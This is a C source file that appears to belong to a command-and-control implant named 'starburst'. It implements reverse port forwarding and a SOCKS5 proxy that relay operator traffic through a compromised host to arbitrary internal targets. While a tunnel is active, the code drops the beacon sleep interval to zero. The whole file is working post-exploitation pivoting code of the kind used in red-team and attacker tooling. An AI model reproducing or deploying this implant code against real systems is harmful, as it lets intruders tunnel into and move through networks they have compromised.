#include "starburst.h"

/* ================================================================
 *  SHARED PROXY HELPERS
 * ================================================================ */

static void proxy_queue_response(uint8_t action, uint32_t server_id, uint8_t *data, uint32_t data_len, int do_exit) {
    packer_t p;
    pk_init(&p);
    pk_byte(&p, action);
    pk_int32(&p, server_id);
    pk_byte(&p, do_exit ? 1 : 0);
    pk_int32(&p, data_len);
    if (data && data_len > 0) {
        pk_ensure(&p, data_len);
        memcpy(p.data + p.len, data, data_len);
        p.len += data_len;
    }

    pthread_mutex_lock(&g_state.rsp_mutex);
    rsp_queue(p.data, p.len);
    pthread_mutex_unlock(&g_state.rsp_mutex);

    pk_free(&p);
}

static proxy_conn_t *proxy_find(proxy_conn_t *conns, uint32_t count, uint32_t server_id) {
    for (uint32_t i = 0; i < count; i++) {
        if (conns[i].active && conns[i].server_id == server_id)
            return &conns[i];
    }
    return NULL;
}

static proxy_conn_t *proxy_alloc(proxy_conn_t *conns, uint32_t max, uint32_t *count, uint32_t server_id) {
    for (uint32_t i = 0; i < max; i++) {
        if (!conns[i].active) {
            conns[i].server_id = server_id;
            conns[i].sock = -1;
            conns[i].active = 1;
            conns[i].connected = 0;
            if (i >= *count) *count = i + 1;
            return &conns[i];
        }
    }
    return NULL;
}

static void proxy_close(proxy_conn_t *conn) {
    if (conn->sock >= 0) {
        close(conn->sock);
        conn->sock = -1;
    }
    conn->active = 0;
    conn->connected = 0;
}

static void proxy_poll_conns(uint8_t action, proxy_conn_t *conns, uint32_t count) {
    uint8_t buf[65536];
    for (uint32_t i = 0; i < count; i++) {
        proxy_conn_t *conn = &conns[i];
        if (!conn->active || !conn->connected) continue;

        ssize_t n = recv(conn->sock, buf, sizeof(buf), 0);
        if (n > 0) {
            proxy_queue_response(action, conn->server_id, buf, (uint32_t)n, 0);
        } else if (n == 0) {
            proxy_close(conn);
            proxy_queue_response(action, conn->server_id, NULL, 0, 1);
        } else if (errno != EAGAIN && errno != EWOULDBLOCK) {
            proxy_close(conn);
            proxy_queue_response(action, conn->server_id, NULL, 0, 1);
        }
    }
}

static int proxy_forward(proxy_conn_t *conn, uint8_t *data, uint32_t data_len) {
    uint32_t sent = 0;
    while (sent < data_len) {
        ssize_t ret = send(conn->sock, data + sent, data_len - sent, 0);
        if (ret > 0) {
            sent += ret;
        } else if (ret < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            break;
        } else {
            return -1;
        }
    }
    return 0;
}

/* ================================================================
 *  RPFWD
 * ================================================================ */

static int rpfwd_connect(proxy_conn_t *conn) {
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%u", g_state.rpfwd.target_port);

    if (getaddrinfo(g_state.rpfwd.target_host, port_str, &hints, &res) != 0 || !res)
        return -1;

    int fd = socket(res->ai_family, SOCK_STREAM, 0);
    if (fd < 0) { freeaddrinfo(res); return -1; }

    struct timeval tv = { 10, 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
        close(fd); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);

    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    conn->sock = fd;
    conn->connected = 1;
    return 0;
}

void rpfwd_route(uint32_t server_id, uint8_t *data, uint32_t data_len, int do_exit) {
    proxy_conn_t *conn = proxy_find(g_state.rpfwd.conns, g_state.rpfwd.conn_count, server_id);

    if (do_exit) {
        if (conn) {
            proxy_close(conn);
            proxy_queue_response(ACTION_RPFWD_MSG, server_id, NULL, 0, 1);
        }
        return;
    }

    if (!conn) {
        conn = proxy_alloc(g_state.rpfwd.conns, RPFWD_MAX_CONNS, &g_state.rpfwd.conn_count, server_id);
        if (!conn) { proxy_queue_response(ACTION_RPFWD_MSG, server_id, NULL, 0, 1); return; }
        if (rpfwd_connect(conn) < 0) {
            proxy_close(conn);
            proxy_queue_response(ACTION_RPFWD_MSG, server_id, NULL, 0, 1);
            return;
        }
        DBG("rpfwd: connected server_id=%u to %s:%u", server_id, g_state.rpfwd.target_host, g_state.rpfwd.target_port);
    }

    if (conn->connected && data && data_len > 0) {
        if (proxy_forward(conn, data, data_len) < 0) {
            proxy_close(conn);
            proxy_queue_response(ACTION_RPFWD_MSG, server_id, NULL, 0, 1);
        }
    }
}

void rpfwd_poll(void) {
    if (!g_state.rpfwd.active) return;
    proxy_poll_conns(ACTION_RPFWD_MSG, g_state.rpfwd.conns, g_state.rpfwd.conn_count);
}

void rpfwd_destroy(void) {
    for (uint32_t i = 0; i < g_state.rpfwd.conn_count; i++)
        if (g_state.rpfwd.conns[i].active) proxy_close(&g_state.rpfwd.conns[i]);
    g_state.rpfwd.active = 0;
    g_state.rpfwd.conn_count = 0;
    g_state.sleep_interval = g_state.rpfwd.saved_sleep;
}

void cmd_rpfwd_handler(const char *task_uuid, parser_t *params) {
    char *action = pr_string(params);
    char *host = pr_string(params);
    uint32_t port = pr_int32(params);

    if (strcmp(action, "start") == 0) {
        if (g_state.rpfwd.active) {
            queue_response(task_uuid, RSP_ERROR, "rpfwd already active");
        } else if (!host || port == 0) {
            queue_response(task_uuid, RSP_ERROR, "missing remote_ip or remote_port");
        } else {
            memset(&g_state.rpfwd, 0, sizeof(g_state.rpfwd));
            g_state.rpfwd.active = 1;
            g_state.rpfwd.saved_sleep = g_state.sleep_interval;
            g_state.rpfwd.target_port = (uint16_t)port;
            strncpy(g_state.rpfwd.target_host, host, sizeof(g_state.rpfwd.target_host) - 1);
            g_state.sleep_interval = 0;
            queue_response(task_uuid, RSP_SUCCESS, "rpfwd started");
        }
    } else if (strcmp(action, "stop") == 0) {
        if (!g_state.rpfwd.active) {
            queue_response(task_uuid, RSP_ERROR, "rpfwd not active");
        } else {
            rpfwd_destroy();
            queue_response(task_uuid, RSP_SUCCESS, "rpfwd stopped");
        }
    } else {
        queue_response(task_uuid, RSP_ERROR, "unknown action");
    }

    free(action); free(host);
}

/* ================================================================
 *  SOCKS5
 * ================================================================ */

void socks_route(uint32_t server_id, uint8_t *data, uint32_t data_len, int do_exit) {
    proxy_conn_t *conn = proxy_find(g_state.socks.conns, g_state.socks.conn_count, server_id);

    if (do_exit) {
        if (conn) {
            proxy_close(conn);
            proxy_queue_response(ACTION_SOCKS_MSG, server_id, NULL, 0, 1);
        }
        return;
    }

    if (!conn) {
        conn = proxy_alloc(g_state.socks.conns, SOCKS_MAX_CONNS, &g_state.socks.conn_count, server_id);
        if (!conn) { proxy_queue_response(ACTION_SOCKS_MSG, server_id, NULL, 0, 1); return; }
    }

    if (!conn->connected && data && data_len >= 3 && data[0] == 0x05) {
        int is_connect = (data_len >= 7 && data[1] >= 0x01 && data[1] <= 0x03 && data[2] == 0x00);

        if (!is_connect) {
            uint8_t greeting_rsp[] = { 0x05, 0x00 };
            proxy_queue_response(ACTION_SOCKS_MSG, server_id, greeting_rsp, 2, 0);
            return;
        }

        uint8_t cmd = data[1];
        uint8_t atyp = data[3];

        if (cmd != 0x01) {
            uint8_t fail[] = { 0x05, 0x07, 0x00, 0x01, 0,0,0,0, 0,0 };
            proxy_queue_response(ACTION_SOCKS_MSG, server_id, fail, 10, 0);
            proxy_close(conn);
            return;
        }

        char host[256] = {0};
        uint16_t port = 0;

        if (atyp == 0x01 && data_len >= 10) {
            snprintf(host, sizeof(host), "%u.%u.%u.%u", data[4], data[5], data[6], data[7]);
            port = ((uint16_t)data[8] << 8) | data[9];
        } else if (atyp == 0x03 && data_len >= 5) {
            uint8_t dlen = data[4];
            if (data_len >= (uint32_t)(5 + dlen + 2)) {
                memcpy(host, data + 5, dlen);
                host[dlen] = '\0';
                port = ((uint16_t)data[5 + dlen] << 8) | data[5 + dlen + 1];
            }
        } else if (atyp == 0x04 && data_len >= 22) {
            /* IPv6 - format as bracket notation */
            inet_ntop(AF_INET6, data + 4, host, sizeof(host));
            port = ((uint16_t)data[20] << 8) | data[21];
        }

        if (host[0] == '\0' || port == 0) {
            uint8_t fail[] = { 0x05, 0x01, 0x00, 0x01, 0,0,0,0, 0,0 };
            proxy_queue_response(ACTION_SOCKS_MSG, server_id, fail, 10, 0);
            proxy_close(conn);
            return;
        }

        struct addrinfo hints = {0}, *res = NULL;
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        char port_str[8];
        snprintf(port_str, sizeof(port_str), "%u", port);

        if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res) {
            uint8_t fail[] = { 0x05, 0x04, 0x00, 0x01, 0,0,0,0, 0,0 };
            proxy_queue_response(ACTION_SOCKS_MSG, server_id, fail, 10, 0);
            proxy_close(conn);
            return;
        }

        int fd = socket(res->ai_family, SOCK_STREAM, 0);
        if (fd < 0) {
            freeaddrinfo(res);
            uint8_t fail[] = { 0x05, 0x01, 0x00, 0x01, 0,0,0,0, 0,0 };
            proxy_queue_response(ACTION_SOCKS_MSG, server_id, fail, 10, 0);
            proxy_close(conn);
            return;
        }

        struct timeval tv = { 10, 0 };
        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

        if (connect(fd, res->ai_addr, res->ai_addrlen) < 0) {
            close(fd); freeaddrinfo(res);
            uint8_t fail[] = { 0x05, 0x05, 0x00, 0x01, 0,0,0,0, 0,0 };
            proxy_queue_response(ACTION_SOCKS_MSG, server_id, fail, 10, 0);
            proxy_close(conn);
            return;
        }
        freeaddrinfo(res);

        int flags = fcntl(fd, F_GETFL, 0);
        fcntl(fd, F_SETFL, flags | O_NONBLOCK);

        conn->sock = fd;
        conn->connected = 1;

        uint8_t ok[] = { 0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0 };
        proxy_queue_response(ACTION_SOCKS_MSG, server_id, ok, 10, 0);
        DBG("socks: connected server_id=%u to %s:%u", server_id, host, port);
        return;
    }

    if (conn->connected && data && data_len > 0) {
        if (proxy_forward(conn, data, data_len) < 0) {
            proxy_close(conn);
            proxy_queue_response(ACTION_SOCKS_MSG, server_id, NULL, 0, 1);
        }
    }
}

void socks_poll(void) {
    if (!g_state.socks.active) return;
    proxy_poll_conns(ACTION_SOCKS_MSG, g_state.socks.conns, g_state.socks.conn_count);
}

void socks_destroy(void) {
    for (uint32_t i = 0; i < g_state.socks.conn_count; i++)
        if (g_state.socks.conns[i].active) proxy_close(&g_state.socks.conns[i]);
    g_state.socks.active = 0;
    g_state.socks.conn_count = 0;
    g_state.sleep_interval = g_state.socks.saved_sleep;
}

void cmd_socks_handler(const char *task_uuid, parser_t *params) {
    char *action = pr_string(params);

    if (strcmp(action, "start") == 0) {
        if (g_state.socks.active) {
            queue_response(task_uuid, RSP_ERROR, "socks already active");
        } else {
            memset(&g_state.socks, 0, sizeof(g_state.socks));
            g_state.socks.active = 1;
            g_state.socks.saved_sleep = g_state.sleep_interval;
            g_state.sleep_interval = 0;
            queue_response(task_uuid, RSP_SUCCESS, "socks started");
        }
    } else if (strcmp(action, "stop") == 0) {
        if (!g_state.socks.active) {
            queue_response(task_uuid, RSP_ERROR, "socks not active");
        } else {
            socks_destroy();
            queue_response(task_uuid, RSP_SUCCESS, "socks stopped");
        }
    } else {
        queue_response(task_uuid, RSP_ERROR, "unknown action");
    }

    free(action);
}
